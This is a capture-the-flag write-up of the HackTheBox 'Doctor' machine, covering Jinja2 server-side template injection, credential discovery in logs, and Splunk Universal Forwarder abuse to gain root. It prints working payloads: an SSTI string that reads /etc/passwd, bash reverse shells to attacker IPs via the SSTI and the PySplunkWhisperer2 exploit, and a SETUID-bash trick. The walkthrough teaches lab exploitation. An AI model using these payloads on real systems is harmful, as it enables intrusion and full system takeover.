---
layout: post
title: "Doctor - HackTheBox"
permalink: "/doctor-hackthebox"
color: rgb(50, 168, 105)
excerpt_separator: <!--more-->
author: ritiksahni
tags: [Web, Linux, SSTI, Jinja2, Splunk, CVE, RCE]
---

<center><img src="assets/img/posts/doctor-htb/doctor_header.png"></center><br>

This box is created by [Shaun Whorton](https://twitter.com/WhortonMr) aka egotisticalSW. This box takes us through discovering a chat web application and exploiting a server-side template injection vulnerability in it to achieve code execution and receiving a stable shell to do further privilege escalation by reading logs and exploiting an instance of Splunk Universal Forwarder to gain root!

<!--more-->

<!--#
img-path="/assets/img/posts/doctor-htb/"
$-->

## Contents <a name="top">
* [Port Scanning](#port-scanning)
* [HTTP (Port 80)](#web-80)
    * [Understanding SSTI](#understanding-ssti)
* [Privilege Escalation to Shaun](#privesc-shaun)
    * [Understanding System Groups](#understanding-groups)
* [Privilege Escalation to root](#privesc-root)
    * [Understanding the Exploit](#understanding-exploit)

---

## Port Scanning <a name="port-scanning">

```
Nmap scan report for 10.10.10.209
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb  4 21:56:34 2021 -- 1 IP address (1 host up) scanned in 31.74 seconds
```

We can observe that there are 2 ports open:

Port 22 - SSH (OpenSSH 8.2p1 Ubuntu)
Port 80 - HTTP (Apache httpd 2.4.41)

---

## HTTP (Port 80) <a name="web-80">

By visiting http://10.10.10.209 we can see a normal website which highlights healthcare services.

![80-homepage](/assets/img/posts/doctor-htb/doctor-port80.png)

There's a small pane where there are contact details present, we can see an email address there.

![doctor-email](/assets/img/posts/doctor-htb/doctors-email.png)

By `info@doctors.htb` we can assume that there is a host with this name. We need to add the host doctors.htb in our /etc/hosts file, after doing that we can access http://doctors.htb and see a messaging application for doctors.

![doctor-chat](assets/img/posts/doctor-htb/doctor_messaging_login.png)

We can simply navigate to the register page and create an account for this messaging web application. After registering successfully, we get a success message: `Your account has been created, with a time limit of twenty minutes!`. We this we can assume that the account will stay in the database for the next 20 minutes and will get deleted after that time period.


After logging in, we have 3 options in the navigation bar... "New Message", "Account" and "Logout".

New Message button lands us to a page where we can create a post with a title and the content.

![newmessage](assets/img/posts/doctor-htb/doctor_newmessage.png)

The account page just gives us information about the account with which we are currently logged in.

Viewing the page source of the application while being logged in, I found an interesting HTML comment which is...


```html
<!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
```

We can see a new endpoint which is /archive, visiting /archive just gives us a blank page but viewing its page source gives us an interesting output...


```xml
<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
<title>Archive</title>
<item><title>Hey!</title></item>

</channel>
			
```

We see XML code and it has a title tag with the value of the title I just posted a while ago. To confirm it, I posted another message with a different title "Testing for dynamic source" and that reflected back too on /archive

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
<title>Archive</title>
<item><title>Testing for dynamic source</title></item>
</channel>	
```

Now we know that /archive has dynamic source code that reflects the title of each post published on the chatting application. In real-world, such functionality could be used to store the names of posts published on any blog page, social media as archived data (similar to how RSS feeds work!)

After playing around with the new message input for a while, I saw that the input was vulnerable to SSTI (server-side template injection).

#### Understanding SSTI <a name="understanding-ssti">

Developers use template engines in web applications to present dynamic content, in this case, we can see that the XML content is based upon the user-controlled post titles and that indicates that a template engine could be in use in the backend. There are many popular template engines like Mako, Smarty, Jinja2, Twig. In case the user-controlled data is presented as dynamic content and input sanitization is not used then the user can store arbitrary payload which makes the template engine reveal sensitive information or execute system commands based upon the template engine's configuration.

Refer to the following diagram to understand how to detect the back-end template engine if the application is vulnerable to SSTI:

![diagram](assets/img/posts/doctor-htb/diagram.png)

P.S. This blog also uses a template engine ;-)

---

We can use a basic payload \{\{7\*7\}\} and we will see the number 49 in the archive source page. This happens because the template engine renders \{\{7\*7\}\} and this payload can make the template engine print the actual calculation of 7 x 7 which results in 49, hence the output 49 in the archive source page.

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
<title>Archive</title>
<item><title>49</title></item>
</channel>
```

After surfing a little I came across this great article on Jinja2 SSTI which helped me gain RCE on the box -- [https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)

It gives a nice little payload which can help us execute system commands: \{\{request.application.\_\_globals__.\_\_builtins__.\_\_import__('os').popen('cat /etc/passwd').read()\}\}

After posting this as the post title, we can see the following output in http://doctors.htb/archive

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
<title>Archive</title>
<item><title>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
web:x:1001:1001:,,,:/home/web:/bin/bash
_rpc:x:126:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:127:65534::/var/lib/nfs:/usr/sbin/nologin
exim:x:31:31:Exim Daemon:/dev/null:/bin/false
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash
splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
</title></item>
</channel>
```

We can execute commands! The next step is to execute a reverse shell payload to get a proper shell.

For that, we need to publish the following payload as the post title...

\{\{request.application.\_\_globals__.\_\_builtins__.\_\_import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.7/9000 0>&1"').read()\}\}

Make sure to change the IP and port to which you have the access to. We should get a reverse shell once we post a message with the above payload as the title.

![reverse-shell-web](/assets/img/posts/doctor-htb/revshell-web.png)

---

## Privilege Escalation to Shaun <a name="privesc-shaun">


Running `id` as the user "web" we get the `uid=1001(web) gid=1001(web) groups=1001(web),4(adm)` as the output. It tells us that the user "web" belongs to a group called "adm". This group is a system group, let's understand what are system groups...

#### Understanding System Groups <a name="understanding-groups">

Linux system groups are groups that are specifically for users with capabilities in the system such as monitoring logs and processes, maintaining backups, etc.

In this box, we have found a user "web" which is in the group "adm".
The group "adm" is a system group for users with capabilities to monitor system tasks, they have access to the directory /var/log which stores the log files generated by different utilities and software such as Apache2, MySQL, PostgreSQL, Samba logs, etc.


---

As we now know that we can read logs from /var/log directory, we can try and look for any interesting log files present in /var/log. After some time of reading many log files, I saw that there was an interesting file at `/var/log/apache2/backup`. This looked like a regular apache2 access.log file's backup.

After scrolling up in that file, I saw a POST request being made to http://doctor.htb/reset_password and this is the complete log of that request:
```
10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```

This request originated from 10.10.14.4 on 05 Sep 2020, although it's a POST request, there is a GET parameter `email` with the value `Guitar123`. I used it as a password to login to shaun and I was successful!

![shaun-login](assets/img/posts/doctor-htb/shaun-userflag.png)

---

## Privilege Escalation to Root <a name="privesc-root">

We now had a user shell, time to escalate our privileges further. Reading /etc/passwd we had a unique entry which was `splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash`. This tells us that there is a user splunk and its home directory was `/opt/splunkforwarder/`. This is actually the installation path where a software called "Splunk Universal Forwarder" has been installed.


According to splunk's website, the universal forwarder is used for secure data collection from remote hosts for indexing and consolidation in the Splunk servers.


I came across an article that shows us the way to achieve remote code execution through Splunk forwarders - [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)

The article points towards a public exploit which is [https://raw.githubusercontent.com/cnotin/SplunkWhisperer2/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py](https://raw.githubusercontent.com/cnotin/SplunkWhisperer2/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py)

We can use `python3 PySplunkWhisperer2_remote.py --host doctors.htb --lhost 10.10.14.8 --username shaun --password Guitar123 --payload 'bash -c "bash -i >& /dev/tcp/10.10.14.8/9001 0>&1"'` to execute a bash reverse shell payload on the host. It'll give us a shell as root.

![root_shell](assets/img/posts/doctor-htb/root_shell.png)

> Quick Tip: If you don't want a reverse shell, you can also mark /bin/bash as SETUID using "chmod +s /bin/bash" and just run "/bin/bash -p" from user shell (shaun).

We got root! Let's now understand how the exploit worked and we got root access by a running Splunk Universal Forwarder.

---

#### Understanding the Exploit <a name="understanding-exploit">

Public Exploit Link: [https://raw.githubusercontent.com/cnotin/SplunkWhisperer2/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py](https://raw.githubusercontent.com/cnotin/SplunkWhisperer2/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py)  
We will understand the exploit by breaking down the functions and classes. The exploit code is written in Python.


- **create_splunk_bundle** - This __function__ creates a TAR configuration bundle which will simply be the payload file on the go. A bundle is a set of common configuration files that is distributed to the nodes in the Splunk network during a single operation. 

- **CustomHandler** - This __class__ starts a HTTP request handler using `http.server` module which had been imported earlier.

- **ThreadedHTTPServer** - This __class__ starts an HTTP server and stop it when the task is completed, the exploit starts this webserver to deliver the configuration bundle to the victim host.

After the web server starts on localhost, the exploit __authenticates__ into the victim host with the supplied username and password, downloads the bundle from the host machine, and creates an app from that inside the splunk base of the victim host where we can interact with deployed apps and then the webserver is shut off. It's like uploading a web shell and interacting with it, just a little more complex in the case of Splunk instances.

Once the command is executed, the deployed app or the bundle is deleted from the server.

**We're done! I hope you enjoyed this walkthrough and learned about SSTI, RCE through Splunk Forwarders. Shaun Whorton (egotisticalSW) did a great job creating this box. Feel free to contact me on my socials for feedback, suggestions! [Contact Me](/contact)**

[Back to Top](#top)